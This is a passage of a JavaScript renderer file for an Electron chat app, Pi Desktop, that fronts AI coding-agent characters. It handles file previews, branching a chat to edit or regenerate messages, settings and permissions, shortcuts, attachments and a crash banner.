    h("button", { onclick: () => openOut(p) }, "Open"), h("button", { onclick: () => desk.reveal(p) }, "Reveal"));
  let view;
  if (ext === "html" || ext === "htm" || ext === "pdf") view = h("iframe", { class: "viewer", sandbox: ext === "pdf" ? null : "allow-scripts", src: "file://" + encodeURI(p) });
  else if (/^(png|jpe?g|gif|webp|svg)$/.test(ext)) view = h("div", { class: "viewer-text" }, h("img", { src: "file://" + encodeURI(p), style: "max-width:100%;border-radius:10px" }));
  else {
    const txt = await desk.read(p);
    view = h("div", { class: "viewer-text" }, txt == null ? h("div", { class: "blank" }, "Can't preview this file.") : ext === "md" ? md(txt) : h("pre", {}, txt.slice(0, 200000)));
  }
  body.replaceChildren(bar, view);
}

// ---------- edit / regenerate (Pi fork: new branch from before that message) ----------
async function resendFrom(index, text) {
  const id = CK(), p = P(id);
  await live(id);
  if (p.streaming) return toast(`${C().name} is still working. Stop first (Esc).`, "warning");
  const fm = await desk.cmd(id, { type: "get_fork_messages" });
  if (!fm.success || !fm.data.messages.length) { renderThread(); return toast("This chat can't be branched here.", "error"); }
  const users = p.msgs.filter((m) => m.role === "user");
  const want = textOf(users[index]?.content).trim();
  const list = fm.data.messages;
  const entry = list.length === users.length ? list[index]
    : (list[index] && list[index].text.trim() === want ? list[index] : list.filter((x) => x.text.trim() === want).pop());
  if (!entry) { renderThread(); return toast("Couldn't find that message to branch from.", "error"); }
  const r = await desk.cmd(id, { type: "fork", entryId: entry.entryId });
  if (!r.success || r.data?.cancelled) { renderThread(); return toast(r.error || "Branch cancelled", "warning"); }
  await syncState(id);
  await loadMessages(id);
  input.value = text; autosize(); send();
}
function regenerate() {
  const users = P().msgs.filter((m) => m.role === "user");
  if (users.length) resendFrom(users.length - 1, textOf(users[users.length - 1].content));
}

// ---------- sheets (confirm, settings, shortcuts) ----------
function sheet(build, { wide = false } = {}) {
  const back = h("div", { class: "sheet-back" });
  const box = h("div", { class: "dialog" + (wide ? " wide" : "") });
  const close = () => { back.remove(); document.removeEventListener("keydown", onKey, true); };
  const onKey = (e) => { if (e.key === "Escape") { e.stopPropagation(); close(); } };
  back.addEventListener("mousedown", (e) => { if (e.target === back) close(); });
  document.addEventListener("keydown", onKey, true);
  build(box, close);
  back.append(box); document.body.append(back);
  return close;
}
function confirmModal({ title, body, confirm = "OK", danger = false }) {
  return new Promise((res) => sheet((box, close) => {
    const done = (v) => { close(); res(v); };
    const ok = h("button", { class: "btn primary" + (danger ? " danger" : ""), onclick: () => done(true) }, confirm);
    box.append(h("div", { class: "title" }, title), h("div", { class: "sub-txt" }, body),
      h("div", { class: "row" }, h("button", { class: "btn", onclick: () => done(false) }, "Cancel"), ok));
    setTimeout(() => ok.focus(), 0);
  }));
}
async function openSettings() {
  const cfg = await desk.config();
  const perm = await desk.permStatus();
  sheet((box, close) => {
    const field = (label, el, hint) => h("label", { class: "field" }, h("span", { class: "fl" }, label), el, hint ? h("span", { class: "fh" }, hint) : null);
    const name = h("input", { value: cfg.userName || "" });
    const hotkey = h("input", { value: cfg.hotkey || "", spellcheck: "false" });
    const providers = h("input", { value: (cfg.modelProviders || []).join(", "), spellcheck: "false" });
    const chk = (v) => { const c = h("input", { type: "checkbox" }); c.checked = !!v; return c; };
    const notify = chk(cfg.notifyWhenHidden), thinking = chk(cfg.showThinking !== false), login = chk(cfg.openAtLogin);
    const finSound = chk(cfg.finishSound !== false), finVoice = chk(cfg.finishVoice !== false);
    // Microphone picker: applies immediately (no Save needed); the meter shows the chosen input is live.
    const micSel = h("select", {}, h("option", { value: "" }, "System default"));
    const micBar = h("span", { class: "mic-lvl-bar" });
    // The mic only opens when you press Test (and closes after 8 s), never just by opening Settings.
    let stopMeter = () => {}, testTimer = 0;
    const testBtn = h("button", { class: "btn", style: "padding:3px 10px;font-size:12px", onclick: async (e) => {
      e.preventDefault();
      if (testTimer) { clearTimeout(testTimer); testTimer = 0; stopMeter(); micBar.style.width = "0"; testBtn.textContent = "Test mic"; return; }
      stopMeter(); stopMeter = await micMeter(micBar); testBtn.textContent = "Stop";
      testTimer = setTimeout(() => { testTimer = 0; stopMeter(); micBar.style.width = "0"; testBtn.textContent = "Test mic"; }, 8000);
    } }, "Test mic");
    const micPick = h("div", { class: "mic-pick" },
      h("label", { class: "field" }, h("span", { class: "fl" }, "Voice typing input"), micSel,
        h("span", { class: "fh" }, "Press Test mic and talk to see the level. Tip: right-click the mic button in the chat box to switch quickly.")),
      h("div", { style: "display:flex;align-items:center;gap:10px" }, h("div", { class: "mic-lvl", style: "flex:1;margin:0" }, micBar), testBtn));
    const fillMics = async () => {
      if (perm.mic !== "granted") { micSel.disabled = true; micSel.firstChild.textContent = "Microphone access is off (see Permissions below)"; return; }
      let devs = await micDevices();
      // Device names stay hidden until a mic has been opened once: open and close it immediately (no meter left running).
      if (devs.some((d) => !d.label)) { try { (await navigator.mediaDevices.getUserMedia({ audio: true })).getTracks().forEach((t) => t.stop()); devs = await micDevices(); } catch {} }
      micSel.replaceChildren(h("option", { value: "" }, "System default"), ...devs.map((d) => h("option", { value: d.deviceId }, d.label || "Unnamed mic")));
      micSel.value = devs.some((d) => d.deviceId === MIC.id) ? MIC.id : "";
    };
    micSel.addEventListener("change", async () => { setMic((await micDevices()).find((d) => d.deviceId === micSel.value) || null); if (testTimer) { stopMeter(); stopMeter = await micMeter(micBar); } });
    fillMics();
    const save = async () => {
      const r = await desk.saveConfig({ userName: name.value.trim(), hotkey: hotkey.value.trim() || cfg.hotkey, notifyWhenHidden: notify.checked,
        showThinking: thinking.checked, finishSound: finSound.checked, finishVoice: finVoice.checked, openAtLogin: login.checked, modelProviders: providers.value.split(",").map((x) => x.trim()).filter(Boolean) });
      if (r?.error) return toast(r.error, "error");
      S.cfg = await desk.config(); S.user = S.cfg.userName; S.providers = S.cfg.modelProviders || [];
      close(); renderAll(); renderChars(); toast("Settings saved");
    };
    box.append(h("div", { class: "title" }, "Settings"),
      field("Your name", name, "Characters greet you with this."),
      field("Show / hide hotkey", hotkey, "Electron accelerator, e.g. Alt+Shift+Space"),
      field("Model picker providers", providers, "Comma-separated; empty shows every provider. Each harness's own default is always included."),
      h("label", { class: "check" }, notify, "Notify me when a character finishes while the app is hidden"),
      h("label", { class: "check" }, thinking, "Show thinking blocks in replies"),
      h("label", { class: "check" }, finSound, "Play a chime when a character finishes"),
      h("label", { class: "check" }, finVoice, h("span", {}, "Say the character's finish line, like “Scout has findings.”"),
        h("button", { class: "btn", style: "margin-left:auto;padding:3px 10px;font-size:12px", onclick: (e) => { e.preventDefault(); desk.previewFinish(S.active); } }, `Preview ${C().name}`)),
      h("label", { class: "check" }, login, "Open Pi Desktop at login (keeps scheduled tasks running)"),
      h("div", { class: "perm-hd" }, "Microphone"), micPick,
      h("div", { class: "perm-hd" }, "Permissions"),
      ...[["files", "Files & folders", perm.files ? "granted" : "not granted", "Full Disk Access: lets every chat and routine read Documents, Desktop, Downloads and the Trash without prompts, like Terminal. Add Pi Desktop in System Settings, then reopen the app."],
          ["mic", "Microphone", perm.mic === "granted" ? "granted" : perm.mic === "denied" ? "denied" : "not asked yet", "For voice typing (transcribed on this Mac)."],
          ["notifications", "Notifications", "", "Alerts when a chat finishes while the app is hidden."]]
        .map(([kind, name, state, hint]) => h("div", { class: "perm-row" },
          h("div", { class: "pm" }, h("div", { class: "pn" }, name, state ? h("span", { class: "ps " + (state === "granted" ? "ok" : "no") }, state === "granted" ? "✓ granted" : state) : null), h("div", { class: "fh" }, hint)),
          h("button", { class: "btn", onclick: () => desk.permOpen(kind) }, "Open settings"))),
      h("div", { class: "fh", style: "margin-top:10px" }, `Characters live in ${S.charDir || "characters/"} (one <harness>.json each)`),
      h("div", { class: "row" }, h("button", { class: "btn", onclick: close }, "Cancel"), h("button", { class: "btn primary", onclick: save }, "Save")));
  });
}
// An Electron accelerator ("Alt+Shift+Space") as the Mac shows it ("⌥⇧Space").
const keyLabel = (acc) => acc.split("+").map((k) => ({ alt: "⌥", option: "⌥", shift: "⇧", cmd: "⌘", command: "⌘", commandorcontrol: "⌘", cmdorctrl: "⌘", ctrl: "⌃", control: "⌃" })[k.toLowerCase()] || k).join("");
function openShortcuts() {
  const rows = [["⌘N", "New chat"], ["⌘K", "Switch character"], ["⌘1 – ⌘9", "Jump to character"], ["⌘B", "Toggle sidebar"], ["⌘\\", "Toggle side panel"],
    ["⌘⇧D", "Voice typing"], ["⌘⇧E", "Export chat as HTML"], ["⌘,", "Settings"], ["Enter", "Send (while replying: steer)"], ["⇧Enter", "New line"],
    ["Esc", "Stop the reply"], ["/", "Slash commands"], [keyLabel(S.cfg?.hotkey || "Alt+Shift+Space"), "Show / hide app (anywhere)"]];
  sheet((box, close) => box.append(h("div", { class: "title" }, "Keyboard shortcuts"),
    h("div", { class: "keys" }, rows.map(([k, d]) => h("div", { class: "krow" }, h("kbd", {}, k), h("span", {}, d)))),
    h("div", { class: "row" }, h("button", { class: "btn primary", onclick: close }, "Done"))));
}

// ---------- sidebar collapse, scroll button, badge ----------
function toggleSidebar(force) {
  const on = force ?? !document.body.classList.contains("side-collapsed");
  document.body.classList.toggle("side-collapsed", on);
  localStorage.sideCollapsed = on ? "1" : "0";
}
$("#sideToggle").addEventListener("click", () => toggleSidebar());
$("#newChat").addEventListener("click", () => newChat());
if (localStorage.sideCollapsed === "1") toggleSidebar(true);
const scrollBtn = $("#toBottom");
scrollBtn.addEventListener("click", () => { S.stick = true; $("#scroller").scrollTo({ top: $("#scroller").scrollHeight, behavior: "smooth" }); });
$("#scroller").addEventListener("scroll", () => { scrollBtn.hidden = isNearBottom() || !P().msgs.length; });
function updateBadge() { desk.badge(Object.values(S.per).filter((c) => c.unread).length); } // unread chats, across characters

// ---------- attachments: button + drag and drop ----------
const IMG_RE = /\.(png|jpe?g|gif|webp)$/i;
async function attachPaths(paths) {
  const p = P(), notes = [];
  for (const f of paths) {
    if (IMG_RE.test(f)) { const img = await desk.readImage(f); if (img) { p.attachments.push(img); continue; } }
    notes.push(f);
  }
  if (notes.length) { input.value = (input.value ? input.value.replace(/\s*$/, "\n") : "") + notes.join("\n") + "\n"; }
  autosize(); input.focus();
}
$("#attachBtn").addEventListener("click", async () => attachPaths(await desk.pickFiles()));
const comp = $("#composer");
comp.addEventListener("dragover", (e) => { e.preventDefault(); comp.classList.add("drop"); });
comp.addEventListener("dragleave", () => comp.classList.remove("drop"));
comp.addEventListener("drop", (e) => {
  e.preventDefault(); comp.classList.remove("drop");
  const paths = [...e.dataTransfer.files].map((f) => desk.pathForFile(f)).filter(Boolean);
  if (paths.length) attachPaths(paths);
});
document.addEventListener("dragover", (e) => e.preventDefault());
document.addEventListener("drop", (e) => e.preventDefault());

// ---------- crash banner ----------
function renderCrash() {
  const p = P(), box = $("#crash");
  box.hidden = !p.crashed;
  if (!p.crashed) return;
  // The two first-run failures get a plain answer: pi not on the PATH, or the harness script itself missing/not executable.
  const err = p.crashed.stderr || "";
  const why = /\bpi: (command )?not found|exec: pi: not found/.test(err) ? "Pi isn't installed (or isn't on your PATH). Run: npm install -g @earendil-works/pi-coding-agent, then Restart."
    : /ENOENT|EACCES|permission denied|No such file/i.test(err) && p.crashed.code === 127 ? `The harness script for ${C().name} is missing or not executable (chmod +x it), then Restart.`
    : `${C().name}'s Pi process stopped (exit ${p.crashed.code}).`;
  box.replaceChildren(h("span", {}, why),
    p.crashed.stderr ? h("button", { class: "link", onclick: () => toast(p.crashed.stderr, "error") }, "Details") : null,
    h("button", { class: "btn primary", onclick: async () => {
      const file = p.sessionFile; p.crashed = null; renderCrash();
      p.msgs = []; p.livePromise = null;
      await live(p.key);
    } }, "Restart"));
}

// ---------- native menu ----------
desk.onMenu((what) => S.active && ({
  "new-chat": newChat, switcher: () => switcher($("#sideFoot .profile")), export: () => exportThread(null),
  "toggle-sidebar": () => toggleSidebar(), "toggle-panel": togglePanel, settings: openSettings, shortcuts: openShortcuts,
})[what]?.());

// ---------- snappy clicks: act on mouse-down, like a native app ----------
// Elements marked data-fast fire on press (saves the wait until release). The click that follows that same press is then
// swallowed. It is matched to the button that was pressed (not a time window), so a slow release on a busy Mac can't
// fire it twice, and it still matches if the button was re-rendered while the mouse was down.
let fastPress = null;
const fastSig = (el) => (el.dataset.pop || "") + "|" + el.className + "|" + (el.textContent || "").slice(0, 40);
document.addEventListener("pointerdown", (e) => {
  if (e.button !== 0 || e.ctrlKey || !e.isPrimary) return;
  const el = e.target.closest("[data-fast]");
  if (!el || e.target.closest(".th-more, input, textarea, a, .th-rename")) return;
  fastPress = { sig: fastSig(el), at: performance.now() };
  el.click();
}, true);
document.addEventListener("pointercancel", () => { fastPress = null; }, true);
document.addEventListener("click", (e) => {
  if (!e.isTrusted || !fastPress) return;
  const el = e.target.closest?.("[data-fast]");
  if (performance.now() - fastPress.at > 8000) { fastPress = null; return; }  // a press that never produced a click (dragged away)
  if (el && fastSig(el) === fastPress.sig) { e.stopPropagation(); e.preventDefault(); fastPress = null; }
}, true);

// ---------- keyboard ----------
document.addEventListener("keydown", (e) => {
  // ⌘N ⌘K ⌘B ⌘\ ⌘, ⌘/ ⌘⇧E come from the native menu (desk.onMenu).
  if (e.metaKey && e.shiftKey && e.key.toLowerCase() === "d") { e.preventDefault(); toggleVoice(); }
  else if (e.metaKey && /^[1-9]$/.test(e.key)) {
    const busy = !$("#modal").hidden || document.querySelector(".sheet-back") || (/^(INPUT|TEXTAREA)$/.test(document.activeElement.tagName) && document.activeElement.value);
    const c = charGroups().flat[+e.key - 1];
    if (c && !busy) { e.preventDefault(); selectCharacter(c.id); }
  }
  else if (e.key === "Escape" && !$("#popover").hidden) closePopover();
  else if (e.key === "Escape" && P().streaming && document.activeElement !== input) abort();
});
window.addEventListener("focus", () => { if (P().unread) { P().unread = false; renderChars(); } updateBadge(); });

boot();
